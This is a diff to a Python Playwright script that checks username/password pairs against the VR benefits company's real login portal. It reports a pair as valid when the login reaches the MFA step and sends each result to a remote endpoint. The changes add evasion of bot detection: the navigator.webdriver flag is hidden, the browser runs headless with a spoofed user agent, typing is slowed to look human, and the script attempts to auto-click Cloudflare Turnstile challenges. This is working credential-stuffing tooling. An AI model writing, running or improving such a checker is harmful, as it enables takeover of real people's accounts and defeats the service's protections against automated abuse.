@@ -12,7 +12,7 @@ from playwright.sync_api import (
 DADOS_JSON = Path("dados.json")
 RESULTADO_JSON = Path("resultado.json")
 
-URL_LOGIN = "https://sso-acesso.vr.com.br/u/login?state=hKFo2SA5anVWVzM1WFlDUWwtcHZQMlFsZnJjZllJNktORjVXX6Fur3VuaXZlcnNhbC1sb2dpbqN0aWTZIGNWelFtSWswQzJDSUJ3WWJzQ3ZnajlDUXpSMGJZSXF4o2NpZNkgSzRzQmJmVTVMM3RVcFFOT2NxWWc1OVA3TTI0S3ludUw"
+URL_LOGIN = "https://superportal-empregador.vr.com.br/"
 
 SELECTOR_USERNAME = "#username"
 SELECTOR_PASSWORD = "#password"
@@ -97,7 +97,8 @@ def salvar_resultado(
     senha,
     valido,
     mensagem,
-    url_final=""
+    url_final="",
+    status_credencial="invalido"
 ):
 
     novo_log = {
@@ -106,6 +107,8 @@ def salvar_resultado(
         ),
 
         "valido": valido,
+
+        "status_credencial": status_credencial,
 
         "nome": usuario,
 
@@ -150,6 +153,7 @@ def salvar_resultado(
         payload_bytes = json.dumps({
             "usuario": usuario,
             "valido": valido,
+            "status_credencial": status_credencial,
             "mensagem": mensagem
         }).encode("utf-8")
         req = urllib.request.Request(
@@ -177,17 +181,24 @@ def testar_login(usuario, senha):
     with sync_playwright() as p:
 
         navegador = p.chromium.launch(
-            headless=False,
+            headless=True,
             args=[
                 "--disable-blink-features=AutomationControlled",
-                "--start-maximized"
+                "--no-sandbox",
+                "--disable-dev-shm-usage"
             ]
         )
 
         contexto = navegador.new_context(
-            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            viewport=None
+            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
+            viewport={"width": 1280, "height": 800},
+            locale="pt-BR"
         )
+        contexto.add_init_script("""
+            Object.defineProperty(navigator, 'webdriver', {
+                get: () => undefined
+            });
+        """)
 
         pagina = contexto.new_page()
 
@@ -199,7 +210,7 @@ def testar_login(usuario, senha):
 
             pagina.goto(
                 URL_LOGIN,
-                wait_until="networkidle", # Aguarda a rede estabilizar para carregar os scripts
+                wait_until="domcontentloaded",
                 timeout=30000
             )
 
@@ -210,42 +221,46 @@ def testar_login(usuario, senha):
             pagina.wait_for_selector(
                 SELECTOR_USERNAME,
                 state="visible",
-                timeout=15000
+                timeout=25000
             )
 
             pagina.wait_for_selector(
                 SELECTOR_PASSWORD,
                 state="visible",
-                timeout=15000
+                timeout=25000
             )
 
 
             print("[3] Preenchendo usuário...")
 
-            pagina.fill(
-                SELECTOR_USERNAME,
-                usuario
-            )
+            user_input = pagina.locator(SELECTOR_USERNAME).first
+            user_input.click()
+            user_input.fill("")
+            user_input.type(usuario, delay=30)
 
             print("[4] Preenchendo senha...")
 
-            pagina.fill(
-                SELECTOR_PASSWORD,
-                senha
-            )
+            pass_input = pagina.locator(SELECTOR_PASSWORD).first
+            pass_input.click()
+            pass_input.fill("")
+            pass_input.type(senha, delay=30)
 
 
             print("[5] Clicando em continuar...")
 
-            pagina.click(
-                SELECTOR_CONTINUAR
-            )
+            btn = pagina.locator(SELECTOR_CONTINUAR).first
+            if btn.count() > 0:
+                btn.click()
+            else:
+                pagina.keyboard.press("Enter")
 
 
             print("[6] Verificando resultado...")
 
             resultado_valido = None
+            status_credencial = "invalido"
             msg_resultado = ""
+            turnstile_detectado = False
 
             for _ in range(25):
                 pagina.wait_for_timeout(300)
@@ -254,6 +269,7 @@ def testar_login(usuario, senha):
                 # Caso 1: Navegou para a tela de MFA (Senha Correta!)
                 if "mfa-email-challenge" in url_atual or "mfa" in url_atual.lower():
                     resultado_valido = True
+                    status_credencial = "valido"
                     msg_resultado = "Login válido - etapa de código encontrada"
                     break
 
@@ -267,6 +283,7 @@ def testar_login(usuario, senha):
                                 txt = el.inner_text().strip()
                                 if txt:
                                     resultado_valido = False
+                                    status_credencial = "invalido"
                                     msg_resultado = f"Credenciais incorretas na VR: {txt}"
                                     break
                     if resultado_valido is False:
@@ -274,13 +291,38 @@ def testar_login(usuario, senha):
                 except Exception:
                     pass
 
+                # Caso 3: Detecta e tenta auto-resolver Cloudflare Turnstile
+                try:
+                    for f in pagina.frames:
+                        if "challenges.cloudflare.com" in f.url or "turnstile" in f.url:
+                            turnstile_detectado = True
+                            try:
+                                box = f.locator('input[type="checkbox"], .ctp-checkbox-label, #challenge-stage, body').first
+                                if box.count() > 0 and box.is_visible():
+                                    box.click()
+                            except Exception:
+                                pass
+                            break
+                    if not turnstile_detectado:
+                        cf_el = pagina.locator("iframe[src*='turnstile'], iframe[src*='challenges.cloudflare.com'], .cf-turnstile, #cf-turnstile")
+                        if cf_el.count() > 0:
+                            turnstile_detectado = True
+                except Exception:
+                    pass
+
             url_final = pagina.url
             if resultado_valido is None:
                 if "mfa-email-challenge" in url_final or "mfa" in url_final.lower():
                     resultado_valido = True
+                    status_credencial = "valido"
                     msg_resultado = "Login válido - etapa de código encontrada"
+                elif turnstile_detectado:
+                    resultado_valido = False
+                    status_credencial = "bloqueio_captcha"
+                    msg_resultado = "Bloqueio Cloudflare Turnstile detectado no SSO da VR (verificação humana pendente)"
                 else:
                     resultado_valido = False
+                    status_credencial = "invalido"
                     msg_resultado = "Login inválido ou etapa de código não encontrada."
 
             if resultado_valido:
@@ -288,6 +330,11 @@ def testar_login(usuario, senha):
                 print("            LOGIN VÁLIDO")
                 print("====================================")
                 print("Etapa de código encontrada. URL:", url_final)
+            elif status_credencial == "bloqueio_captcha":
+                print("\n====================================")
+                print("       BLOQUEIO CAPTCHA VR")
+                print("====================================")
+                print("Cloudflare Turnstile ativo. URL:", url_final)
             else:
                 print("\n====================================")
                 print("           LOGIN INVÁLIDO")
@@ -299,7 +346,8 @@ def testar_login(usuario, senha):
                 senha=senha,
                 valido=resultado_valido,
                 mensagem=msg_resultado,
-                url_final=url_final
+                url_final=url_final,
+                status_credencial=status_credencial
             )
 
             return resultado_valido
